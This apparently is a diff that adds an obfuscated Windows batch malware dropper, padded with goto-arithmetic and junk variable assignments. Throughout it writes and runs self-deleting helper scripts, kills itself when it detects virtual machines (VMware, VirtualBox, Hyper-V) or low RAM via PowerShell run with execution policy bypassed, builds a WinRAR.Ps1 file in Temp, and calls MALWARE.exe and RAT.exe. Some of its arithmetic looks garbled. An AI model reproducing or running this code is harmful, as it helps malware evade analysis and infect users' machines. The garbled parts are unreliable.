+set "H1=D" 
+set /a aNs=0x3*0x3*021*(0x300x319) 
+gotO      (0x3*0x3*021*(0x300x319))  
+:659181  
+for /l %%c  in (758  758  758) do (
+ set "J1=F" 
+)
+for /l %%a  in (578  578  578) do (
+ set "K1=G" 
+)
+set "L1=H" 
+for /l %%f  in (855  855  855) do (
+ set "M1=I" 
+)
+set /a anS=0xd*~-41184 
+goTO     (0xd*~-41184)  
+:543735  
+set /a aNs=03*0xb*0x2b*~-318 
+gOto (03*0xb*0x2b*~-318)  
+:754534  
+set /a aNS=03*((0x56ba70x1a3b3)>>2) 
+gOTO      (03*((0x56ba70x1a3b3)>>2))  
+:667580  
+set "Q1=M" 
+set "R1=N" 
+for /l %%u  in (830  830  830) do (
+ set "S1=O" 
+)
+for /l %%t  in (143  143  143) do (
+ set "T1=P" 
+)
+set "U1=Q" 
+set /a anS=2*2*0x11*(0310x76a) 
+goTO   (2*2*0x11*(0310x76a))  
+:651998  
+set/a ans=2*0x3*0x5*021*((0276501321)>>2) 
+gotO     (2*0x3*0x5*021*((0276501321)>>2))  
+:916194  
+for /l %%i  in (758  758  758) do (
+ set "X1=T" 
+)
+for /l %%t  in (156  156  156) do (
+ set "Y1=U" 
+)
+set "Z1=V" 
+for /l %%d  in (892  892  892) do (
+ set "A1=W" 
+)
+set "B1=X" 
+set "C1=Y" 
+set "D1=Z" 
+for /l %%j  in (60  60  60) do (
+ timeout 0 >nul 
+)
+  . >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+set /a ans=2*2*0x5*((02110350627671)>>2) 
+goTO      (2*2*0x5*((02110350627671)>>2))  
+:648513  
+GOTO ךزζतഝഞنمِٹ  
+doskey ATTRIB=CHKNTFS 
+:λُฐრطںβፕુں0
+set /a ans=(013362710602134) 
+gOTO ((013362710602134))  
+:868737  
+   (   ) >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+set /a ans=2*2*03*051*~-1172 
+gotO       (2*2*03*051*~-1172)  
+:589988  
+GOTO fَોഢყਕकνبಗ  
+echo BAT_DLL.exe >nul 2>nul 
+:ثгなҳّذોаِن7
+goto :EOF
+:772919  
+@echo off 
+set /a ans=03*0x3*015*0x17*0117 
+goto (03*0x3*015*0x17*0117)  
+:290340  
+set "e=a" 
+set /a ans=0x3*0x6b*~-1832 
+goto (0x3*0x6b*~-1832)  
+:367095  
+set "g=c" 
+set /a ans=((0342523500xb3e5c8)>>5) 
+goto (((0342523500xb3e5c8)>>5))  
+:273645  
+set "i=e" 
+set /a ans=0xb*~-35408 
+goto (0xb*~-35408)  
+:351760  
+for /l %%j  in (755  755  755) do (
+ set "j=f" 
+)
+set /a ans=((0x12d0x609)>>2)*~-888 
+goto (((0x12d0x609)>>2)*~-888)  
+:379559  
+set "k=g" 
+set /a ans=0100*0xb*0x11*0x1d 
+echo @echo off >> kdotrFxkj.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotrFxkj.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotrFxkj.bat 
+
+ call kdotrFxkj.bat 
+goto (0100*0xb*0x11*0x1d)  
+:693416  
+set "m=i" 
+set /a ans=2*0x2f*057*0247 
+goto (2*0x2f*057*0247)  
+:881466  
+set "q=m" 
+set /a ans=013*0x1d*((0573160x267e)>>4) 
+goto (013*0x1d*((0573160x267e)>>4))  
+:144045  
+for /l %%t  in (921  921  921) do (
+ set "r=n" 
+)
+set /a ans=05*023*((05772760x335cbe)>>9) 
+echo @echo off >> kdotZXOJI.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotZXOJI.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotZXOJI.bat 
+
+ call kdotZXOJI.bat 
+goto (05*023*((05772760x335cbe)>>9))  
+:511645  
+set "u=q" 
+set /a ans=0x5*0x5*0x11*023*0x49 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (0x5*0x5*0x11*023*0x49)  
+:880591  
+set "v=r" 
+set /a ans=023*~-30852 
+goto (023*~-30852)  
+:727305  
+set "z=v" 
+set /a ans=2*(0320416027563) 
+goto (2*(0320416027563))  
+:986407  
+set "E1=A" 
+set /a ans=2*((0x7abf0xe63f)>>7)*((0xd1c0901631011)>>9) 
+goto (2*((0x7abf0xe63f)>>7)*((0xd1c0901631011)>>9))  
+:817103  
+for /l %%i  in (292  292  292) do (
+ set "F1=B" 
+)
+set /a ans=0x5*0x5*05*0x7*((0xe6050x2745)>>6) 
+goto (0x5*0x5*05*0x7*((0xe6050x2745)>>6))  
+:335955  
+set "H1=D" 
+set /a ans=0x3*0x7*~-6230 
+goto (0x3*0x7*~-6230)  
+:232116  
+set "J1=F" 
+set /a ans=2*03*0265*(05320x35) 
+goto (2*03*0265*(05320x35))  
+:410423  
+for /l %%r  in (436  436  436) do (
+ set "L1=H" 
+)
+set /a ans=03*((014076540x1c6ae2c)>>7) 
+goto (03*((014076540x1c6ae2c)>>7))  
+:331022  
+set "S1=O" 
+set /a ans=0x43*((0255362707353427)>>7) 
+goto (0x43*((0255362707353427)>>7))  
+:522445  
+set "V1=R" 
+set /a ans=03*0x5*~-30872 
+echo @echo off >> kdotrfTPa.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotrfTPa.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotrfTPa.bat 
+
+ call kdotrfTPa.bat 
+goto (03*0x5*~-30872)  
+:184434  
+for /l %%v  in (771  771  771) do (
+ set "W1=S" 
+)
+set /a ans=(0x18b0x3ca)*((0303266501741665)>>9) 
+goto ((0x18b0x3ca)*((0303266501741665)>>9))  
+:751647  
+for /l %%t  in (288  288  288) do (
+ set "Y1=U" 
+)
+set /a ans=(0x1d6cc0x5b9f3) 
+goto ((0x1d6cc0x5b9f3))  
+:341251  
+set "Z1=V" 
+set /a ans=015*0xd*~-4328 
+goto (015*0xd*~-4328)  
+:357934  
+for /l %%s  in (342  342  342) do (
+ set "A1=W" 
+)
+set /a ans=0xd*(01306560x1b09d) 
+echo @echo off >> kdotHpkvw.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotHpkvw.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotHpkvw.bat 
+
+ call kdotHpkvw.bat 
+goto (0xd*(01306560x1b09d))  
+:182044  
+for /l %%u  in (884  884  884) do (
+ set "C1=Y" 
+)
+set /a ans=2*0x67*((0157130x22f3)>>3) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*0x67*((0157130x22f3)>>3))  
+:825726  
+set "D1=Z" 
+set /a ans=((0161650605)>>4)*(022000x30d) 
+goto (((0161650605)>>4)*(022000x30d))  
+:575812  
+chcp 65001 > nul 
+set /a ans=07*(0x441b0x2924) 
+goto (07*(0x441b0x2924))  
+:842381  
+set KDOT=kh1OF6KvnTmCfANYR8JM0EyDgLp2aX4qzZIdxVbGu7cUiPHosBwSl5tjQW3er9 
+set /a ans=2*2*(03672070xeafc) 
+goto (2*2*(03672070xeafc))  
+:845843  
+if   ==   (
+ wscript /b 
+) else (
+mshta 
+)
+set /a ans=05*(0411640xa1f7) 
+goto (05*(0411640xa1f7))  
+:907949  
+for /l %%s  in (405  405  405) do (
+ set "e=a" 
+)
+set /a ans=0x3*~-380*~-578 
+goto (0x3*~-380*~-578)  
+:665522  
+for /l %%i  in (517  517  517) do (
+ set "g=c" 
+)
+set /a ans=2*05*~-12968 
+echo @echo off >> kdotqKiZzt.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotqKiZzt.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotqKiZzt.bat 
+
+ call kdotqKiZzt.bat 
+goto (2*05*~-12968)  
+:707313  
+set "i=e" 
+set /a ans=2*2*2*2*0117*((01663110x107c9)>>8) 
+goto (2*2*2*2*0117*((01663110x107c9)>>8))  
+:511645 
+:930494  
+set "n=j" 
+set /a ans=2*2*075*(043020x547) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*2*075*(043020x547))  
+:450372  
+set "o=k" 
+set /a ans=2*2*2*2*2*07*0x2f*065 
+goto (2*2*2*2*2*07*0x2f*065)  
+:987117  
+for /l %%n  in (322  322  322) do (
+ set "p=l" 
+)
+set /a ans=2*2*03*03*013*~-1980 
+goto (2*2*03*03*013*~-1980)  
+:223743  
+set "q=m" 
+set /a ans=~-402752 
+goto (~-402752)  
+:836510  
+for /l %%s  in (709  709  709) do (
+ set "s=o" 
+)
+set /a ans=2*2*2*0xb*0x49*0177 
+goto (2*2*2*0xb*0x49*0177)  
+:862888  
+set "t=p" 
+set /a ans=2*05*(0xdde00x7931) 
+goto (2*05*(0xdde00x7931))  
+:806663  
+for /l %%u  in (58  58  58) do (
+ set "x=t" 
+)
+set /a ans=0x2b*0x47*0211 
+goto (0x2b*0x47*0211)  
+:807745  
+set "z=v" 
+set /a ans=0x3*0x1d*(0x6f3015012) 
+goto (0x3*0x1d*(0x6f3015012))  
+:678260  
+for /l %%f  in (520  520  520) do (
+ set "a=w" 
+)
+set /a ans=2*05*(023003607225) 
+goto (2*05*(023003607225))  
+:512877  
+for /l %%o  in (335  335  335) do (
+ set "d=z" 
+)
+set /a ans=2*05*05*((04534700x7a7b8)>>7) 
+goto (2*05*05*((04534700x7a7b8)>>7))  
+:853268  
+set "E1=A" 
+set /a ans=2*2*2*0x3*0x3b*((0210006047206)>>7) 
+goto (2*2*2*0x3*0x3b*((0210006047206)>>7))  
+:506159  
+for /l %%m  in (424  424  424) do (
+ set "G1=C" 
+)
+set /a ans=0x5*0x5*07*0x1d*0x47 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%fjiFcAWF%%ElAXVhx%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%EWLtWdb%%lgHwLWuY%%a\nif "%%xaIxcEUz%%JVRfIqRiBiFlSMc%%nNgJRSKwtKYGFpLF%%AbWjyUgjeQGkyEl%%TSgTUJHzVqwStThWd%%UAaISLfhCbZKdmiJru%%UhoEfQsRwZxNamxu%%jCIMuGGswyTKhRQhvW%%lLwkyEBRypWEqxWnE%%VrMPZKMEqhYwVqwUEJ%%UJNzqGbnbPPkHepwS%%IKNddgpXagvcoqmz%%VnJCXFJnfXfsxROIJ%%CGrUZxvF%%"=="Microsoft Corporation" if "%%QaKHDAHYR%%pGlOhzeissbyvUIB%%LGgZIZaYkdttYxdZKa%%nGdWrjNziHtRQEr%%vdIiCqyaYeFozNdgP%%WEigIrfedhjATfbqeej%%RtYoReqA%%"=="Virtual Machine" exit\nif "%%zWtfeKI%%fJBfWHhKsirZVXDvDa%%KoaKXYtowXyKWGXab%%cIdGXgpGNjGXqtsZkSe%%wNomjPSyQqdoBJHOzQ%%UvckktnbGOkcAJDuX%%eyYSEkOwTJyaNJwgM%%uteJinVyHoGDyZxL%%qTHUxqOupkvJRidNu%%nqMVIECqqfPsGfM%%JGEahHHnBDCvIsG%%cgqoYTdafrvUWPUjl%%HkXqILQTrnEtNnMYw%%kVJTQPna%%"=="VMware, Inc." exit\nif "%%uiFRWfrH%%sjGwkJGiuTVISxsr%%GMzSmQakOHoqPYNuQ%%rtomVvplzYcfgoukz%%ncWSHVvhanMdAUoJFB%%SCqomXzUeheYUEjvjTA%%TWyUMsKBf%%"=="VirtualBox" exit 
+)
+goto (0x5*0x5*07*0x1d*0x47)  
+:208683  
+set "I1=E" 
+set /a ans=2*2*2*2*0x3*013*021*0x13 
+goto (2*2*2*2*0x3*013*021*0x13)  
+:678260 
+:880994  
+for /l %%m  in (452  452  452) do (
+ set "J1=F" 
+)
+set /a ans=03*0x1f*0x47*0x4f 
+goto (03*0x1f*0x47*0x4f)  
+:154041  
+for /l %%t  in (579  579  579) do (
+ set "K1=G" 
+)
+set /a ans=((0153340x3cc)>>4)*~-1040 
+goto (((0153340x3cc)>>4)*~-1040)  
+:831548  
+for /l %%f  in (383  383  383) do (
+ set "L1=H" 
+)
+set /a ans=2*((07553560x85efa)>>2) 
+echo @echo off >> kdotkbEui.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotkbEui.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotkbEui.bat 
+
+ call kdotkbEui.bat 
+goto (2*((07553560x85efa)>>2))  
+:325587  
+set "O1=K" 
+set /a ans=0107*(062420x393) 
+goto (0107*(062420x393))  
+:933264  
+set "P1=L" 
+set /a ans=0117*~-4284 
+goto (0117*~-4284)  
+:647345  
+set "U1=Q" 
+set /a ans=2*2*2*2*027*~-2310 
+goto (2*2*2*2*027*~-2310)  
+:300274  
+set "Z1=V" 
+set /a ans=0x7*(011020x3d75) 
+goto (0x7*(011020x3d75))  
+:337684  
+for /l %%x  in (44  44  44) do (
+ set "C1=Y" 
+)
+set /a ans=2*0x3*~-148518 
+echo @echo off >> kdotsDCiGK.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotsDCiGK.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotsDCiGK.bat 
+
+ call kdotsDCiGK.bat 
+goto (2*0x3*~-148518)  
+:886401  
+for /l %%k  in (289  289  289) do (
+ set "D1=Z" 
+)
+set /a ans=05*0x7*~-16070 
+echo @echo off >> kdotXJAOx.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotXJAOx.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotXJAOx.bat 
+
+ call kdotXJAOx.bat 
+goto (05*0x7*~-16070)  
+:430086  
+if   ==   (
+ cd   
+) else (
+doskey /listsize=0 
+)
+set /a ans=2*2*~-153764 
+goto (2*2*~-153764)  
+:955293  
+wscript /b 
+set /a ans=2*057*0x43*0x49 
+goto (2*057*0x43*0x49)  
+:958760  
+call MALWARE.exe >nul 2>nul 
+set /a ans=0xb*065*(02460701) 
+goto (0xb*065*(02460701))  
+:290340 
+:751647 
+:330388  
+set "g=c" 
+set /a ans=015*(0x3f7d0xbb58) 
+echo @echo off >> kdotLfxIT.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotLfxIT.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotLfxIT.bat 
+
+ call kdotLfxIT.bat 
+goto (015*(0x3f7d0xbb58))  
+:330891  
+set "i=e" 
+set /a ans=2*2*05*~-49550 
+goto (2*2*05*~-49550)  
+:763406  
+for /l %%r  in (162  162  162) do (
+ set "o=k" 
+)
+set /a ans=03*0x11*(0161740x259) 
+goto (03*0x11*(0161740x259))  
+:144045 
+:431002  
+set "p=l" 
+set /a ans=0x100*((02700330x83f1b)>>8) 
+goto (0x100*((02700330x83f1b)>>8))  
+:532951  
+set "q=m" 
+set /a ans=03*05*~-49920 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (03*05*~-49920)  
+:692213  
+set "v=r" 
+set /a ans=0x59*((046317220x15652)>>7) 
+goto (0x59*((046317220x15652)>>7))  
+:881466 
+:273976  
+for /l %%o  in (979  979  979) do (
+ set "y=u" 
+)
+set /a ans=0x3*0x5*(0x1b5c0x2df3) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (0x3*0x5*(0x1b5c0x2df3))  
+:178461  
+for /l %%u  in (308  308  308) do (
+ set "z=v" 
+)
+set /a ans=(033416740276617) 
+goto ((033416740276617))  
+:443224  
+set "b=x" 
+set /a ans=(06043460x9863d) 
+goto ((06043460x9863d))  
+:845843 
+:480350  
+set "G1=C" 
+set /a ans=0x5*0x5*013*(0xee602333) 
+goto (0x5*0x5*013*(0xee602333))  
+:729700  
+set "H1=D" 
+set /a ans=2*2*2*((022467120x65eb2)>>3) 
+goto (2*2*2*((022467120x65eb2)>>3))  
+:841248  
+for /l %%i  in (694  694  694) do (
+ set "J1=F" 
+)
+set /a ans=2*035*((02767410xde89)>>3) 
+goto (2*035*((02767410xde89)>>3))  
+:110095  
+for /l %%r  in (675  675  675) do (
+ set "K1=G" 
+)
+set /a ans=2*2*035*((0326030xb0f)>>2) 
+goto (2*2*035*((0326030xb0f)>>2))  
+:351760 
+:711325  
+for /l %%s  in (965  965  965) do (
+ set "R1=N" 
+)
+set /a ans=2*0x3*0x7*(0xeed03566) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*0x3*0x7*(0xeed03566))  
+:537718  
+set "S1=O" 
+set /a ans=2*2*2*0x7*07*0x17*0141 
+goto (2*2*2*0x7*07*0x17*0141)  
+:750028  
+set "T1=P" 
+set /a ans=03*0x3*0x5*0x5*0x17*0103 
+goto (03*0x3*0x5*0x5*0x17*0103)  
+:331022 
+:330388 
+:782524  
+for /l %%d  in (736  736  736) do (
+ set "U1=Q" 
+)
+set /a ans=2*2*2*2*~-47304 
+goto (2*2*2*2*~-47304)  
+:986407 
+:739651  
+set "V1=R" 
+set /a ans=03*05*0111*((0211160106316)>>7) 
+goto (03*05*0111*((0211160106316)>>7))  
+:479372  
+set "W1=S" 
+set /a ans=~-264*(05036015) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (~-264*(05036015))  
+:443224 
+:993178  
+for /l %%u  in (988  988  988) do (
+ set "X1=T" 
+)
+set /a ans=2*023*0x13*0x13*057 
+goto (2*023*0x13*0x13*057)  
+:772919 
+:512877 
+:757995  
+for /l %%o  in (66  66  66) do (
+ set "Z1=V" 
+)
+set /a ans=0xb*027*~-1050 
+echo @echo off >> kdotFKzCYe.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotFKzCYe.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotFKzCYe.bat 
+
+ call kdotFKzCYe.bat 
+goto (0xb*027*~-1050)  
+:880994 
+:433427  
+for /l %%h  in (784  784  784) do (
+ set "B1=X" 
+)
+set /a ans=0x5*013*(077400353) 
+goto (0x5*013*(077400353))  
+:184998  
+set "D1=Z" 
+set /a ans=2*2*05*021*~-1172 
+goto (2*2*05*021*~-1172)  
+:351760 
+:831548 
+:114924  
+for /l %%I  in (32  32  32) do (
+ cd   
+)
+set /a ans=(04452610x48148) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto ((04452610x48148))  
+:183108  
+if 4  equ 39899 (
+ timeout 0 >nul 
+) else (
+cd   
+)
+set /a ans=2*2*2*2*(0xa10b0x39ba) 
+goto (2*2*2*2*(0xa10b0x39ba))  
+:184434 
+:208683 
+:716598  
+echo RAT.exe >nul 2>nul 
+set /a ans=2*0x7*~-32564 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*0x7*~-32564)  
+:838645  
+set "e=a" 
+set /a ans=2*2*2*2*0x3*015*015*0145 
+goto (2*2*2*2*0x3*015*015*0145)  
+:767389  
+for /l %%f  in (946  946  946) do (
+ set "f=b" 
+)
+set /a ans=03*037*~-9222 
+goto (03*037*~-9222)  
+:711326  
+set "i=e" 
+set /a ans=2*0xb5*(0xed0732) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*0xb5*(0xed0732))  
+:833209  
+set "k=g" 
+set /a ans=2*07*0xb*~-4242 
+goto (2*07*0xb*~-4242)  
+:479372 
+:313252  
+set "l=h" 
+set /a ans=2*2*0x3*03*~-18912 
+goto (2*2*0x3*03*~-18912)  
+:418634  
+set "o=k" 
+set /a ans=(0xa8a660x21a2b) 
+goto ((0xa8a660x21a2b))  
+:443224 
+:909259  
+for /l %%b  in (169  169  169) do (
+ set "s=o" 
+)
+set /a ans=2*0x7*021*~-1554 
+goto (2*0x7*021*~-1554)  
+:513303  
+for /l %%n  in (533  533  533) do (
+ set "t=p" 
+)
+set /a ans=~-776160 
+goto (~-776160)  
+:955215  
+set "u=q" 
+set /a ans=0x7*07*~-11678 
+goto (0x7*07*~-11678)  
+:276251  
+for /l %%p  in (497  497  497) do (
+ set "v=r" 
+)
+set /a ans=2*2*0x5*065*(03650x1cc) 
+goto (2*2*0x5*065*(03650x1cc))  
+:294968  
+set "x=t" 
+set /a ans=03*0x3*051*((0x69030xac63)>>5) 
+goto (03*0x3*051*((0x69030xac63)>>5))  
+:532951 
+:286543  
+for /l %%x  in (599  599  599) do (
+ set "z=v" 
+)
+set /a ans=0x3*((0234354570x75d6f)>>6) 
+goto (0x3*((0234354570x75d6f)>>6))  
+:417994  
+set "a=w" 
+set /a ans=03*03*0x3*03*05*013*013*023 
+goto (03*03*0x3*03*05*013*013*023)  
+:430086 
+:680065  
+set "c=y" 
+set /a ans=05*0x17*053*0x35 
+goto (05*0x17*053*0x35)  
+:232116 
+:215621  
+for /l %%n  in (327  327  327) do (
+ set "E1=A" 
+)
+set /a ans=03*0x1f*((010450120x17878a)>>7) 
+goto (03*0x1f*((010450120x17878a)>>7))  
+:909259 
+:128359  
+set "G1=C" 
+set /a ans=0x100*(0x1a90xd1a) 
+goto (0x100*(0x1a90xd1a))  
+:334646  
+for /l %%u  in (377  377  377) do (
+ set "H1=D" 
+)
+set /a ans=2*0x3*0x83*(0x11802421) 
+goto (2*0x3*0x83*(0x11802421))  
+:506159 
+:856905  
+set "I1=E" 
+set /a ans=~-281670 
+goto (~-281670)  
+:688429  
+set "J1=F" 
+set /a ans=2*2*2*0x1f*((0xe41eb01213353)>>8) 
+goto (2*2*2*0x1f*((0xe41eb01213353)>>8))  
+:278473  
+for /l %%y  in (207  207  207) do (
+ set "K1=G" 
+)
+set /a ans=~-662*((0x181030x62303)>>9) 
+goto (~-662*((0x181030x62303)>>9))  
+:325587 
+:711326 
+:775025  
+for /l %%k  in (278  278  278) do (
+ set "M1=I" 
+)
+set /a ans=0x5*(01262310x17424) 
+echo @echo off >> kdotYdWMjS.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotYdWMjS.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotYdWMjS.bat 
+
+ call kdotYdWMjS.bat 
+goto (0x5*(01262310x17424))  
+:480350 
+:884574  
+set "R1=N" 
+set /a ans=2*0x3*05*((0x523f0152363)>>2) 
+goto (2*0x3*05*((0x523f0152363)>>2))  
+:479372 
+:857135  
+for /l %%b  in (568  568  568) do (
+ set "S1=O" 
+)
+set /a ans=((0122623230xcaa2b3)>>5) 
+goto (((0122623230xcaa2b3)>>5))  
+:313252 
+:276251 
+:486922  
+set "U1=Q" 
+set /a ans=(0x13f0220)*~-578 
+goto ((0x13f0220)*~-578)  
+:884574 
+:857135 
+:172064  
+for /l %%i  in (213  213  213) do (
+ set "W1=S" 
+)
+set /a ans=0xb*((0xba0be0x1dbf2e)>>4) 
+goto (0xb*((0xba0be0x1dbf2e)>>4))  
+:232116 
+:825726 
+:624041  
+set "X1=T" 
+set /a ans=2*2*0x5*~-20694 
+goto (2*2*0x5*~-20694)  
+:842381 
+:833209 
+:763739  
+for /l %%v  in (639  639  639) do (
+ set "Y1=U" 
+)
+set /a ans=0x2b*~-3362 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x2b*~-3362)  
+:383217  
+for /l %%m  in (999  999  999) do (
+ set "B1=X" 
+)
+set /a ans=(0xad5d90x45b48) 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%aqspvyhn%%bOTXmzjYx%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%HPBezqy%%rSHVDAW%%a\nif "%%dSMANzD%%UmloSiVZFiRPiJakyK%%MSNwXWBqwPnCBOCFV%%jfvpZDQQjvEyfUDuZu%%PdtmIQRqthmTktC%%KDvGMOTWbQRHUZRs%%oUmvTsCEwwRZMZzOd%%qcLPfIhjyongSYrg%%VBRoGhzDgpdsUlOpX%%cUvlrWZhqtOpPwbs%%jZEgngznAftwvkNoz%%vfPKRpxBaAQBbHEyF%%QEztHYwCnGGCoEyygK%%XyeMfIDy%%"=="Microsoft Corporation" if "%%xboUDche%%MDlebCpuPiOZyJIkXnY%%ueeyeefkwrmntPc%%XRQwRHXzaxHcvbx%%cBojVZQaNQbzUqCs%%uTBrQCvYIhKFoRZMd%%TdJcNvpk%%"=="Virtual Machine" exit\nif "%%QgduxAn%%LfWrKySTBiMeHFObIZq%%XLsetIkQwlhuheSOND%%uljZQcsDjqbhSZKu%%DjCpFtRFgqkMqWlCAM%%aKLOFKWbnOPEpgHW%%vUcyJcQowZmsfcokg%%wWXANgYyDJFFwHLo%%HMzcFFypIMUjiRkxn%%qHKUIRozqqVubbvvs%%KRnrxRrXnchUrTrbN%%wQqsHjwapiuSQUCV%%vBvHMWZRnnFGTXWtEtK%%bmojxaG%%"=="VMware, Inc." exit\nif "%%IIxPyhi%%sMSxSLVmipREpjLp%%bLDqbcmkqabrUunNh%%kcoCRIaYTzkiwFMoL%%rAHbtMCAabMuSvflTi%%bUFGGPNbohTSStreTMI%%NEjEWtWn%%"=="VirtualBox" exit 
+)
+goto ((0xad5d90x45b48))  
+:169688  
+for /l %%v  in (755  755  755) do (
+ set "C1=Y" 
+)
+set /a ans=0x40*03*(01550x123e) 
+goto (0x40*03*(01550x123e))  
+:379559 
+:418634 
+:962350  
+if not   ==   (
+ rundll32 
+) else (
+doskey /listsize=0 
+)
+set /a ans=2*03*((03700200x3cc64)>>2) 
+echo @echo off >> kdotrXhSHE.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotrXhSHE.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotrXhSHE.bat 
+
+ call kdotrXhSHE.bat 
+goto (2*03*((03700200x3cc64)>>2))  
+:507227  
+if 4  equ 80597 (
+ cd   
+) else (
+mshta 
+)
+set /a ans=0x3*03*0225*~-684 
+goto (0x3*03*0225*~-684)  
+:289370  
+set "e=a" 
+set /a ans=2*065*(0161506054) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*065*(0161506054))  
+:379559 
+:745256  
+set "g=c" 
+set /a ans=2*2*2*03*0123*0203 
+goto (2*2*2*03*0123*0203)  
+:341251 
+:230942  
+set "i=e" 
+set /a ans=0x17*~-11262 
+echo @echo off >> kdotzMbEO.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotzMbEO.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotzMbEO.bat 
+
+ call kdotzMbEO.bat 
+goto (0x17*~-11262)  
+:817103 
+:849598  
+set "j=f" 
+set /a ans=2*2*2*(0x118e20x9e61) 
+goto (2*2*2*(0x118e20x9e61))  
+:341251 
+:433583  
+for /l %%d  in (502  502  502) do (
+ set "m=i" 
+)
+set /a ans=2*2*2*2*05*0x3d*0145 
+echo @echo off >> kdotSNTzit.bat 
+
